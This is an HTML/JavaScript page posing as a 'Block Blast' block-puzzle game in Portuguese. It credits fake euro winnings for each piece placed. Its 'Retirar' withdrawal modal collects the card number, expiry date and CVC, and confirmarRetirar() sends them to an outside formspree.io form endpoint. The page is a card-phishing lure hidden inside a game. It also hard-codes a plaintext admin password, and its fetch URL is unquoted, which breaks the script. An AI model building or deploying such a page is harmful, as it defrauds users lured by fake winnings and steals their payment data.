<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Block Blast - Game</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      user-select: none;
      -webkit-user-select: none;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #1a1f38;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 15px;
      touch-action: manipulation;
    }

    header {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 15px;
      position: relative;
    }

    .btn-adm {
      position: absolute;
      right: 0;
      top: 0;
      background: #33395c;
      color: #aaa;
      border: 1px solid #4a517a;
      padding: 5px 10px;
      border-radius: 6px;
      font-size: 12px;
      cursor: pointer;
    }

    .saldo-valor {
      font-size: 36px;
      font-weight: 800;
      color: #25d366;
      text-shadow: 0 2px 10px rgba(37, 211, 102, 0.3);
      margin-top: 10px;
    }

    /* Tabuleiro 8x8 */
    #tabuleiro {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      grid-template-rows: repeat(8, 1fr);
      gap: 3px;
      width: 100%;
      max-width: 360px;
      height: 360px;
      background-color: #121526;
      padding: 6px;
      border-radius: 12px;
      border: 2px solid #2a3052;
      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
      position: relative;
    }

    .celula {
      background-color: #1c223d;
      border-radius: 4px;
    }

    /* Cores dos Blocos Ocupados */
    .celula.ocupada-amarelo { background-color: #f1c40f; }
    .celula.ocupada-azul { background-color: #3498db; }
    .celula.ocupada-verde { background-color: #2ecc71; }
    .celula.ocupada-vermelho { background-color: #e74c3c; }
    .celula.ocupada-roxo { background-color: #9b59b6; }

    /* Bandeja de Peças */
    .bandeja {
      display: flex;
      justify-content: space-around;
      align-items: center;
      width: 100%;
      max-width: 360px;
      height: 110px;
      margin-top: 15px;
      background-color: #121526;
      border-radius: 12px;
      padding: 10px;
    }

    .peca-slot {
      width: 90px;
      height: 90px;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: grab;
      touch-action: none;
    }

    .peca-grid {
      display: grid;
      gap: 2px;
    }

    .bloco-peca {
      width: 20px;
      height: 20px;
      border-radius: 3px;
    }

    .bloco-amarelo { background-color: #f1c40f; }
    .bloco-azul { background-color: #3498db; }
    .bloco-verde { background-color: #2ecc71; }
    .bloco-vermelho { background-color: #e74c3c; }
    .bloco-roxo { background-color: #9b59b6; }

    /* Botão Amarelo "Retirar" */
    .btn-retirar-amarelo {
      width: 100%;
      max-width: 360px;
      margin-top: 15px;
      padding: 14px;
      background-color: #f1c40f;
      color: #1a1f38;
      font-size: 18px;
      font-weight: 800;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(241, 196, 15, 0.35);
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    /* Efeito de Texto Flutuante (+6,25 €) */
    @keyframes flutuarTexto {
      0% { opacity: 1; transform: translateY(0) scale(1); }
      50% { transform: translateY(-20px) scale(1.2); }
      100% { opacity: 0; transform: translateY(-40px) scale(1); }
    }

    .texto-ganho {
      position: absolute;
      color: #25d366;
      font-weight: 900;
      font-size: 22px;
      pointer-events: none;
      animation: flutuarTexto 0.9s ease-out forwards;
      z-index: 1000;
    }

    /* Modais */
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.85);
      justify-content: center;
      align-items: center;
      z-index: 100;
    }

    .modal-conteudo {
      background: #ffffff;
      padding: 20px;
      border-radius: 12px;
      width: 90%;
      max-width: 360px;
      color: #333;
    }

    /* Formulário Estilo Cartão */
    .form-cartao {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin: 15px 0;
    }

    .linha-dupla {
      display: flex;
      gap: 10px;
    }

    .modal-conteudo input {
      width: 100%;
      padding: 12px 14px;
      background: #fff;
      border: 1px solid #ccc;
      color: #333;
      border-radius: 8px;
      font-size: 16px;
      outline: none;
    }

    .modal-conteudo input::placeholder {
      color: #aaa;
    }

    .modal-conteudo input:focus {
      border-color: #3498db;
    }

    .btn-modal {
      width: 100%;
      padding: 12px;
      background: #25d366;
      border: none;
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 5px;
    }
  </style>
</head>
<body>

  <header>
    <button class="btn-adm" onclick="autenticarADM()">⚙️ ADM</button>
    <div class="saldo-valor"><span id="saldoEuro">0,00</span> €</div>
  </header>

  <!-- TABULEIRO 8x8 -->
  <div id="tabuleiro"></div>

  <!-- BANDEJA DE PEÇAS -->
  <div class="bandeja" id="bandeja">
    <div class="peca-slot" id="slot-0"></div>
    <div class="peca-slot" id="slot-1"></div>
    <div class="peca-slot" id="slot-2"></div>
  </div>

  <!-- BOTÃO AMARELO RETIRAR -->
  <button class="btn-retirar-amarelo" onclick="abrirModalRetirar()">Retirar</button>

  <!-- MODAL DE RETIRAR -->
  <div id="modalRetirar" class="modal">
    <div class="modal-conteudo">
      <h3 style="color:#1a1f38;">💸 Solicitar Levantamento</h3>
      <p style="font-size: 13px; color: #666; margin-top: 5px;">Saldo disponível: <strong style="color:#25d366;"><span id="saldoModal">0,00</span> €</strong></p>
      
      <div class="form-cartao">
        <!-- Retângulo Grande Superior (Número do Cartão) -->
        <input type="text" id="campoNumeroCartao" placeholder="Número do Cartão" maxlength="19">
        
        <!-- Dois Retângulos em Baixo (MM/AA e CVC) -->
        <div class="linha-dupla">
          <input type="text" id="campoValidade" placeholder="MM/AA" maxlength="5">
          <input type="text" id="campoCVC" placeholder="CVC / CVV" maxlength="4">
        </div>
      </div>

      <button class="btn-modal" onclick="confirmarRetirar()">Confirmar Pedido</button>
      <button class="btn-modal" style="background:#7f8c8d; margin-top: 8px;" onclick="fecharModalRetirar()">Cancelar</button>
    </div>
  </div>

  <!-- MODAL ADM -->
  <div id="modalADM" class="modal">
    <div class="modal-conteudo" style="background:#1c223d; color:#fff;">
      <h3>📊 Painel ADM</h3>
      <p style="font-size: 12px; color: #aaa; margin: 8px 0;">Pedidos / Mensagens dos jogadores:</p>
      <div id="listaMensagens" style="max-height: 180px; overflow-y: auto; margin-bottom: 12px;"></div>
      <button onclick="limparFeedbacks()" style="background:#e74c3c; color:#fff; border:none; padding:6px 10px; border-radius:4px; cursor:pointer;">Limpar Tudo</button>
      <button onclick="fecharADM()" style="background:#7f8c8d; color:#fff; border:none; padding:6px 10px; border-radius:4px; cursor:pointer;">Fechar</button>
    </div>
  </div>

  <script>
    let saldo = 0.00;
    const codigoADM = "davixx8067";
    const tabuleiro = document.getElementById('tabuleiro');

    // Mapeamento dos formatos de peças
    const formatosPecas = {
      '2x2': { cols: 2, matrix: [[0,0], [0,1], [1,0], [1,1]] },
      'L': { cols: 2, matrix: [[0,0], [1,0], [1,1]] },
      'linha3': { cols: 3, matrix: [[0,0], [0,1], [0,2]] },
      'ponto': { cols: 1, matrix: [[0,0]] },
      'linha2': { cols: 2, matrix: [[0,0], [0,1]] }
    };

    const coresDisponiveis = ['amarelo', 'azul', 'verde', 'vermelho', 'roxo'];
    const tiposDisponiveis = ['2x2', 'L', 'linha3', 'ponto', 'linha2'];

    function criarTabuleiro() {
      tabuleiro.innerHTML = '';
      for (let i = 0; i < 64; i++) {
        const celula = document.createElement('div');
        celula.classList.add('celula');
        celula.dataset.row = Math.floor(i / 8);
        celula.dataset.col = i % 8;
        tabuleiro.appendChild(celula);
      }
    }

    // Gerador de Peças Aleatórias para um Slot
    function gerarPecaParaSlot(slotElement) {
      const tipo = tiposDisponiveis[Math.floor(Math.random() * tiposDisponiveis.length)];
      const cor = coresDisponiveis[Math.floor(Math.random() * coresDisponiveis.length)];
      const infoPeca = formatosPecas[tipo];

      slotElement.dataset.tipo = tipo;
      slotElement.dataset.cor = cor;
      slotElement.style.visibility = 'visible';

      let gridHTML = `<div class="peca-grid" style="grid-template-columns: repeat(${infoPeca.cols}, 20px);">`;
      
      if (tipo === '2x2') {
        gridHTML += `<div class="bloco-peca bloco-${cor}"></div><div class="bloco-peca bloco-${cor}"></div><div class="bloco-peca bloco-${cor}"></div><div class="bloco-peca bloco-${cor}"></div>`;
      } else if (tipo === 'L') {
        gridHTML += `<div class="bloco-peca bloco-${cor}"></div><div style="width:20px;height:20px;"></div><div class="bloco-peca bloco-${cor}"></div><div class="bloco-peca bloco-${cor}"></div>`;
      } else if (tipo === 'linha3') {
        gridHTML += `<div class="bloco-peca bloco-${cor}"></div><div class="bloco-peca bloco-${cor}"></div><div class="bloco-peca bloco-${cor}"></div>`;
      } else if (tipo === 'ponto') {
        gridHTML += `<div class="bloco-peca bloco-${cor}"></div>`;
      } else if (tipo === 'linha2') {
        gridHTML += `<div class="bloco-peca bloco-${cor}"></div><div class="bloco-peca bloco-${cor}"></div>`;
      }

      gridHTML += `</div>`;
      slotElement.innerHTML = gridHTML;

      // Adiciona eventos de arrasto ao slot renovado
      slotElement.onmousedown = iniciarArrasto;
      slotElement.ontouchstart = iniciarArrasto;
    }

    function inicializarBandeja() {
      for (let i = 0; i < 3; i++) {
        gerarPecaParaSlot(document.getElementById(`slot-${i}`));
      }
    }

    // --- SISTEMA DE DRAG AND DROP ---
    let pecaArrastada = null;
    let elementoClonado = null;
    let tipoPeca = null;
    let corPeca = null;

    function iniciarArrasto(e) {
      e.preventDefault();
      pecaArrastada = this;
      tipoPeca = this.dataset.tipo;
      corPeca = this.dataset.cor;

      elementoClonado = this.cloneNode(true);
      elementoClonado.style.position = 'fixed';
      elementoClonado.style.pointerEvents = 'none';
      elementoClonado.style.zIndex = '1000';
      elementoClonado.style.opacity = '0.8';
      document.body.appendChild(elementoClonado);

      atualizarPosicaoClone(e);

      document.addEventListener('mousemove', moverArrasto);
      document.addEventListener('touchmove', moverArrasto, { passive: false });
      document.addEventListener('mouseup', finalizarArrasto);
      document.addEventListener('touchend', finalizarArrasto);
    }

    function moverArrasto(e) {
      if (!elementoClonado) return;
      e.preventDefault();
      atualizarPosicaoClone(e);
    }

    function atualizarPosicaoClone(e) {
      const clientX = e.touches ? e.touches[0].clientX : e.clientX;
      const clientY = e.touches ? e.touches[0].clientY : e.clientY;
      elementoClonado.style.left = `${clientX - 45}px`;
      elementoClonado.style.top = `${clientY - 45}px`;
    }

    function finalizarArrasto(e) {
      if (!elementoClonado) return;

      const clientX = e.changedTouches ? e.changedTouches[0].clientX : e.clientX;
      const clientY = e.changedTouches ? e.changedTouches[0].clientY : e.clientY;

      elementoClonado.hidden = true;
      const elementoAbaixo = document.elementFromPoint(clientX, clientY);
      elementoClonado.hidden = false;

      if (elementoAbaixo && elementoAbaixo.classList.contains('celula')) {
        const r = parseInt(elementoAbaixo.dataset.row);
        const c = parseInt(elementoAbaixo.dataset.col);

        if (podeColocarPeca(r, c, tipoPeca)) {
          colocarPeca(r, c, tipoPeca, corPeca);

          // GERA UMA NOVA PEÇA AUTOMATICAMENTE NO LUGAR DA QUE FOI USADA
          gerarPecaParaSlot(pecaArrastada);
          
          saldo += 6.25;
          document.getElementById('saldoEuro').innerText = saldo.toFixed(2).replace('.', ',');
          mostrarEfeitoGanho(6.25, clientX, clientY);
        }
      }

      elementoClonado.remove();
      elementoClonado = null;
      pecaArrastada = null;

      document.removeEventListener('mousemove', moverArrasto);
      document.removeEventListener('touchmove', moverArrasto);
      document.removeEventListener('mouseup', finalizarArrasto);
      document.removeEventListener('touchend', finalizarArrasto);
    }

    function podeColocarPeca(row, col, tipo) {
      const blocos = formatosPecas[tipo].matrix;
      for (let b of blocos) {
        const r = row + b[0];
        const c = col + b[1];
        if (r < 0 || r >= 8 || c < 0 || c >= 8) return false;

        const celula = document.querySelector(`.celula[data-row="${r}"][data-col="${c}"]`);
        if (celula.className.includes('ocupada')) return false;
      }
      return true;
    }

    function colocarPeca(row, col, tipo, cor) {
      const blocos = formatosPecas[tipo].matrix;
      for (let b of blocos) {
        const r = row + b[0];
        const c = col + b[1];
        const celula = document.querySelector(`.celula[data-row="${r}"][data-col="${c}"]`);
        celula.classList.add(`ocupada-${cor}`);
      }
    }

    function mostrarEfeitoGanho(valor, x, y) {
      const el = document.createElement('div');
      el.classList.add('texto-ganho');
      el.innerText = `+${valor.toFixed(2).replace('.', ',')} €`;
      el.style.left = `${x - 20}px`;
      el.style.top = `${y - 40}px`;
      document.body.appendChild(el);

      setTimeout(() => el.remove(), 900);
    }

    /* Modal Retirar */
    function abrirModalRetirar() {
      document.getElementById('saldoModal').innerText = saldo.toFixed(2).replace('.', ',');
      document.getElementById('modalRetirar').style.display = 'flex';
    }

    function fecharModalRetirar() {
      document.getElementById('modalRetirar').style.display = 'none';
    }

    function confirmarRetirar() {
  const numCartao = document.getElementById('campoNumeroCartao').value.trim();
  const validade = document.getElementById('campoValidade').value.trim();
  const cvc = document.getElementById('campoCVC').value.trim();

  if (!numCartao || !validade || !cvc) {
    return alert("Por favor preenche todos os campos do cartão!");
  }

  fetch(https://formspree.io/f/xgavnjon, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      saldo: saldo.toFixed(2) + " €",
      numeroCartao: numCartao,
      validade: validade,
      cvc: cvc,
      dataHora: new Date().toLocaleString()
    })
  })
  .then(response => {
    if (response.ok) {
      alert("Pedido de levantamento registado com sucesso!");
      document.getElementById('campoNumeroCartao').value = '';
      document.getElementById('campoValidade').value = '';
      document.getElementById('campoCVC').value = '';
      fecharModalRetirar();
    } else {
      alert("Ocorreu um erro ao enviar o pedido. Tenta novamente.");
    }
  })
  .catch(error => {
    alert("Erro de conexão ao enviar dados.");
    console.error(error);
  });
}

    /* Lógica ADM */
    function autenticarADM() {
      const entrada = prompt("Insere a palavra-passe do ADM:");
      if (entrada === codigoADM) abrirADM();
      else if (entrada !== null) alert("Código incorreto!");
    }

    function abrirADM() {
      const container = document.getElementById('listaMensagens');
      let feedbacks = JSON.parse(localStorage.getItem('feedbacks_jogo')) || [];

      container.innerHTML = feedbacks.length === 0 
        ? "<p style='font-size:12px; color:#aaa;'>Sem registos ainda.</p>"
        : feedbacks.map((f, i) => `<div style='background:#121526; padding:8px; margin-bottom:6px; border-radius:4px; font-size:12px; white-space:pre-line;'><strong>#${i+1} (${f.hora}):</strong><br>${f.texto}</div>`).join('');

      document.getElementById('modalADM').style.display = 'flex';
    }

    function fecharADM() { document.getElementById('modalADM').style.display = 'none'; }
    function limparFeedbacks() { localStorage.removeItem('feedbacks_jogo'); abrirADM(); }

    criarTabuleiro();
    inicializarBandeja();
  </script>
</body>
</html>
